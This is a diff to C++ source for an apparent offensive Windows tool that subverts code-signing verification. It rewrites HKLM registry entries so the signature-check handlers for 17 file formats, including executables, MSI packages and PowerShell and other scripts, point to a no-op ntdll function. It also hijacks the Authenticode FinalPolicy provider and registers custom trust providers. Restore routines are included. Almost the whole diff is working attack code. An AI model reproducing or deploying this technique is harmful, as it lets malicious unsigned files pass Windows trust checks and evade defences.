@@ -19,9 +19,8 @@ struct WIN_CERTIFICATE {
 
 bool SetRegistryValues(HKEY rootKey, LPCWSTR subkey, LPCWSTR dllPath, LPCWSTR funcName, REGSAM accessFlag) {
     if (g_verbose) std::wcout << L"[*] Opening key: " << subkey << std::endl;
-    
     HKEY hKey;
-    LONG result = RegOpenKeyExW(rootKey, subkey, 0, KEY_SET_VALUE | accessFlag, &hKey);
+    LONG result = RegCreateKeyExW(rootKey, subkey, 0, nullptr, 0, KEY_SET_VALUE | accessFlag, nullptr, &hKey, nullptr);
     if (result != ERROR_SUCCESS) {
         std::wcerr << L"[-] Failed to open key: " << subkey << L" (Error " << result << L")" << std::endl;
         return false;
@@ -48,17 +47,72 @@ bool SetRegistryValues(HKEY rootKey, LPCWSTR subkey, LPCWSTR dllPath, LPCWSTR fu
     return true;
 }
 
-bool hook_registry()
+std::wstring normalize_provider_guid(const std::wstring& guid) {
+    std::wstring normalized = guid;
+    if (normalized.empty()) return normalized;
+    if (normalized.front() != L'{') normalized.insert(normalized.begin(), L'{');
+    if (normalized.back() != L'}') normalized.push_back(L'}');
+    return normalized;
+}
+
+bool hijack_finalpolicy() {
+    if (g_verbose) std::cout << "[*] Hijacking FinalPolicy (SoftpubCleanup)..." << std::endl;
+    LPCWSTR subkey = L"SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";
+    return SetRegistryValues(HKEY_LOCAL_MACHINE, subkey, L"C:\\Windows\\System32\\WINTRUST.DLL", L"SoftpubCleanup", KEY_WOW64_64KEY);
+}
+
+bool cleanup_finalpolicy() {
+    if (g_verbose) std::cout << "[*] Restoring FinalPolicy (SoftpubAuthenticode)..." << std::endl;
+    LPCWSTR subkey = L"SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";
+    return SetRegistryValues(HKEY_LOCAL_MACHINE, subkey, L"C:\\Windows\\System32\\WINTRUST.DLL", L"SoftpubAuthenticode", KEY_WOW64_64KEY);
+}
+
+bool hijack_custom_provider(const std::wstring& guid) {
+    if (g_verbose) std::cout << "[*] Registering custom trust provider..." << std::endl;
+    std::wstring subkey = L"SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\" + normalize_provider_guid(guid);
+    return SetRegistryValues(HKEY_LOCAL_MACHINE, subkey.c_str(), L"C:\\Windows\\System32\\WINTRUST.DLL", L"SoftpubCleanup", KEY_WOW64_64KEY);
+}
+
+bool cleanup_custom_provider(const std::wstring& guid) {
+    std::wstring subkey = L"SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\" + normalize_provider_guid(guid);
+    if (g_verbose) std::wcout << L"[*] Removing custom trust provider: " << subkey << std::endl;
+    LONG result = RegDeleteTreeW(HKEY_LOCAL_MACHINE, subkey.c_str());
+    if (result == ERROR_SUCCESS || result == ERROR_FILE_NOT_FOUND || result == ERROR_PATH_NOT_FOUND) {
+        return true;
+    }
+    result = RegDeleteKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), KEY_WOW64_64KEY, 0);
+    if (result == ERROR_SUCCESS || result == ERROR_FILE_NOT_FOUND || result == ERROR_PATH_NOT_FOUND) {
+        return true;
+    }
+    std::wcerr << L"[-] Failed to delete key: " << subkey << L" (Error " << result << L")" << std::endl;
+    return false;
+}
+
+bool hook_registry(bool wow64_only = false)
 {
     if (g_verbose) std::cout << "[*] Hijacking Registry SIP Provider..." << std::endl;
     LPCWSTR dllPath = L"C:\\Windows\\System32\\ntdll.dll";
     LPCWSTR funcName = L"DbgUiContinue";
 
-    // SIP GUIDs
+    // 17 standard SIP GUIDs
     const wchar_t* sips[] = {
         L"{C689AAB8-8E78-11D0-8C47-00C04FC295EE}", // PE
+        L"{C689AAB9-8E78-11D0-8C47-00C04FC295EE}", // Java
+        L"{C689AABA-8E78-11D0-8C47-00C04FC295EE}", // CAB
+        L"{000C10F1-0000-0000-C000-000000000046}", // MSI
         L"{603BCC1F-4B59-4E08-B724-D2C6297EF351}", // PowerShell
-        L"{000C10F1-0000-0000-C000-000000000046}"  // MSI
+        L"{06C9E010-38CE-11D4-A2A3-00104BD35090}", // JScript
+        L"{1629F04E-2799-4DB5-8FE5-ACE10F17EBAB}", // VBScript
+        L"{1A610570-38CE-11D4-A2A3-00104BD35090}", // WSF
+        L"{0AC5DF4B-CE07-4DE2-B76E-23C839A09FD1}", // AppX
+        L"{0F5F58B3-AADE-4B9A-A434-95742D92ECEB}", // AppXBundle
+        L"{CF78C6DE-64A2-4799-B506-89ADFF5D16D6}", // EAppX
+        L"{D1D04F0C-9ABA-430D-B0E4-D7E96ACCE66C}", // EAppXBundle
+        L"{5598CFF1-68DB-4340-B57F-1CACF88C9A51}", // P7X
+        L"{9BA61D3F-E73A-11D0-8CD2-00C04FC295EE}", // CTL
+        L"{DE351A42-8E59-11D0-8C47-00C04FC295EE}", // Flat
+        L"{DE351A43-8E59-11D0-8C47-00C04FC295EE}", // Catalog
+        L"{9F3053C5-439D-4BF7-8A77-04F0450A1D9F}"  // ESD
     };
 
     bool success = true;
@@ -70,8 +124,10 @@ bool hook_registry()
         std::wstring subkey32 = L"SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\";
         subkey32 += guid;
 
-        if (!SetRegistryValues(HKEY_LOCAL_MACHINE, subkey64.c_str(), dllPath, funcName, KEY_WOW64_64KEY))
-            success = false;
+        if (!wow64_only) {
+            if (!SetRegistryValues(HKEY_LOCAL_MACHINE, subkey64.c_str(), dllPath, funcName, KEY_WOW64_64KEY))
+                success = false;
+        }
 
         if (!SetRegistryValues(HKEY_LOCAL_MACHINE, subkey32.c_str(), dllPath, funcName, KEY_WOW64_32KEY))
             success = false;
@@ -87,11 +143,25 @@ bool cleanup_registry()
     LPCWSTR dllPath = L"C:\\Windows\\System32\\WINTRUST.DLL";
     LPCWSTR funcName = L"CryptSIPVerifyIndirectData";
 
-    // SIP GUIDs
+    // 17 standard SIP GUIDs
     const wchar_t* sips[] = {
         L"{C689AAB8-8E78-11D0-8C47-00C04FC295EE}", // PE
+        L"{C689AAB9-8E78-11D0-8C47-00C04FC295EE}", // Java
+        L"{C689AABA-8E78-11D0-8C47-00C04FC295EE}", // CAB
+        L"{000C10F1-0000-0000-C000-000000000046}", // MSI
         L"{603BCC1F-4B59-4E08-B724-D2C6297EF351}", // PowerShell
-        L"{000C10F1-0000-0000-C000-000000000046}"  // MSI
+        L"{06C9E010-38CE-11D4-A2A3-00104BD35090}", // JScript
+        L"{1629F04E-2799-4DB5-8FE5-ACE10F17EBAB}", // VBScript
+        L"{1A610570-38CE-11D4-A2A3-00104BD35090}", // WSF
+        L"{0AC5DF4B-CE07-4DE2-B76E-23C839A09FD1}", // AppX
+        L"{0F5F58B3-AADE-4B9A-A434-95742D92ECEB}", // AppXBundle
+        L"{CF78C6DE-64A2-4799-B506-89ADFF5D16D6}", // EAppX
+        L"{D1D04F0C-9ABA-430D-B0E4-D7E96ACCE66C}", // EAppXBundle
+        L"{5598CFF1-68DB-4340-B57F-1CACF88C9A51}", // P7X
+        L"{9BA61D3F-E73A-11D0-8CD2-00C04FC295EE}", // CTL
+        L"{DE351A42-8E59-11D0-8C47-00C04FC295EE}", // Flat
+        L"{DE351A43-8E59-11D0-8C47-00C04FC295EE}", // Catalog
+        L"{9F3053C5-439D-4BF7-8A77-04F0450A1D9F}"  // ESD
     };
 
     bool success = true;
